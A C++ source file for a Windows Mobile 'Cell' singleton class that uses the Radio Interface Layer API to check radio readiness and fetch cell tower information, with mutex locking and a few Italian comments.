#include "Cell.h"

Cell* Cell::_instance = NULL;
BOOL Cell::_bRadioReady = FALSE;
volatile LONG Cell::lLock = 0;

/************************************************
 * self & Release
 ***********************************************/
Cell* Cell::self(DWORD dwTimeout)
{
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		Sleep(1);

	if (_instance == NULL) {
		_instance = new(std::nothrow) Cell();
		_instance->Initialize(dwTimeout);
	}

	InterlockedExchange((LPLONG)&lLock, 0);

	return _instance;
}

/************************************************
 * Constructor & Destructor
 * Protected members
 ***********************************************/
Cell::Cell(void) : deviceObj(NULL)
{
	_iReference = 0;
	_hMutex = NULL;
	_hRil = INVALID_HANDLE_VALUE;
	_hCellEvent = NULL;
	_dwTimeout = 0;
	_dwLastCell = 0;
	bInitialized = FALSE;
	deviceObj = Device::self();
}

void Cell::Stop() {
	WAIT_AND_SIGNAL(this->_hMutex);

	_iReference--;

	if (_iReference > 0) {
		UNLOCK(this->_hMutex);
		return;
	}

	if (this->_hRil != INVALID_HANDLE_VALUE && this->_hRil != NULL) {
		RIL_Deinitialize(_hRil);
		_hRil = INVALID_HANDLE_VALUE;
	}

	if (_hCellEvent != NULL) {
		CloseHandle(_hCellEvent);
		_hCellEvent = NULL;
	}

	bInitialized = FALSE;
	UNLOCK(this->_hMutex);
}

BOOL Cell::Start() {
	BOOL bRet;

	WAIT_AND_SIGNAL(this->_hMutex);
	_iReference++;

	// Non possiamo fare lo start due volte di seguito
	if (bInitialized) {
		UNLOCK(this->_hMutex);
		return TRUE;
	}

	// Entrambi i parametri sono gia' valorizzati al momento della ::self()
	bRet = Initialize(_dwTimeout);

	UNLOCK(this->_hMutex);
	return bRet;
}

Cell::~Cell() {
	if (this->_hMutex != NULL)
		CloseHandle(_hMutex);

	if (this->_hRil != INVALID_HANDLE_VALUE && this->_hRil != NULL)
		RIL_Deinitialize(_hRil);
	
	if (_hCellEvent != NULL)
		CloseHandle(_hCellEvent);
}

BOOL Cell::Initialize(DWORD dwTimeout) {
	HRESULT hResult;

	if (bInitialized)
		return TRUE;

	_dwTimeout = dwTimeout;

	if (_hMutex == NULL)
		_hMutex = CreateMutex(NULL, FALSE, NULL);

	if (_hMutex == NULL) {
		bInitialized = FALSE;
		return FALSE;
	}

	if (_dwTimeout <= 0) {
		bInitialized = FALSE;
		return FALSE;	// Cannot initialize object!
	}

	 hResult = RIL_Initialize(1, &Cell::_RIL_Callback, &Cell::_RIL_Notify, 
		/*RIL_NCLASS_ALL*/ RIL_NCLASS_NETWORK | RIL_NCLASS_RADIOSTATE | 0x08, (DWORD_PTR)this, &_hRil);

	if (hResult != S_OK) {	// Cell Initialization failed
		bInitialized = FALSE;
		return FALSE;
	}

	if (_hRil != NULL && hResult == S_OK && deviceObj->GetImsi().empty() == FALSE) {
		Cell::_bRadioReady = TRUE;
		_hCellEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	} else {
		_bRadioReady = FALSE;
	}

	if (_hCellEvent == NULL) {
		DBG_TRACE(L"Debug - Cell.cpp - CreateEvent() FAILED [0]\n", 5, FALSE);
	}

	bInitialized = TRUE;
	return TRUE;
}

/************************************************
 * CALLBACK!
 ***********************************************/
void Cell::RIL_Callback(
	DWORD dwCode,           // @parm result code
    HRESULT hrCmdID,        // @parm ID returned by the command that originated this response
    const void* lpData,     // @parm data associated with the notification
    DWORD cbData            // @parm size of the strcuture pointed to lpData
	)
{
	if (hrCmdID == _cellRequestID) {
		if (lpData != NULL)	{	// REQUEST!
			CopyMemory((void *)&_rilCellTowerInfo, lpData, sizeof(RILCELLTOWERINFO));
			_dwLastCell = GetTickCount();
		}

		SetEvent(_hCellEvent);
	}

	return;
}

void Cell::RIL_Notify(
    DWORD dwCode,           // @parm notification code
    const void* lpData,     // @parm data associated with the notification
    DWORD cbData            // @parm size of the strcuture pointed to lpData
	)
{
	return;
}

void Cell::_RIL_Callback(
    DWORD dwCode,           // @parm result code
    HRESULT hrCmdID,        // @parm ID returned by the command that originated this response
    const void* lpData,     // @parm data associated with the notification
    DWORD cbData,           // @parm size of the strcuture pointed to lpData
    DWORD dwParam           // @parm parameter passed to <f RIL_Initialize>
	)
{
	if (dwParam != 0 && Cell::_instance != NULL)
	{	// can accept message!
		Cell::_instance->RIL_Callback(dwCode, hrCmdID, lpData, cbData);
	}
	return;
}

/// TODO!
void Cell::_RIL_Notify(
    DWORD dwCode,           // @parm notification code
    const void* lpData,     // @parm data associated with the notification
    DWORD cbData,           // @parm size of the strcuture pointed to lpData
    DWORD dwParam           // @parm parameter passed to <f RIL_Initialize>
	)
{
	switch(dwCode)
	{
		case RIL_NOTIFY_RADIOEQUIPMENTSTATECHANGED:
			break;
		//case RIL_NOTIFY_RADIORESET:	// unknown state

			//break;
		case RIL_NOTIFY_RADIOPRESENCECHANGED:
			break;
		default:
			// Unknown state
			break;
	}
	return;
}

BOOL Cell::RadioReady()
{
	return Cell::_bRadioReady;
}

/**
 *	Request refresh of ?
 **/
BOOL Cell::RefreshData() {
	WAIT_AND_SIGNAL(this->_hMutex);

	BOOL bResult = FALSE;

	if (RadioReady() == FALSE) {
		UNLOCK(this->_hMutex);
		return bResult;
	}

	// notification callback
	ResetEvent(_hCellEvent);
	HRESULT hResult = RIL_GetCellTowerInfo(_hRil);

	if (hResult > S_OK) {
		_cellRequestID = hResult;

		if (WaitForSingleObject(_hCellEvent, _dwTimeout) == WAIT_OBJECT_0) {
			bResult = TRUE;
		}
	}

	UNLOCK(this->_hMutex);
	return bResult;
}

BOOL Cell::getCELL(RILCELLTOWERINFO *_out)
{
	if (_hCellEvent == INVALID_HANDLE_VALUE || _hCellEvent == NULL)
		return FALSE;

	if (RadioReady() == FALSE)
		return FALSE;

	if (RefreshData()) {
		CopyMemory((void *)_out, &_rilCellTowerInfo, sizeof(RILCELLTOWERINFO));
		return TRUE;
	}
	
	return FALSE;
}
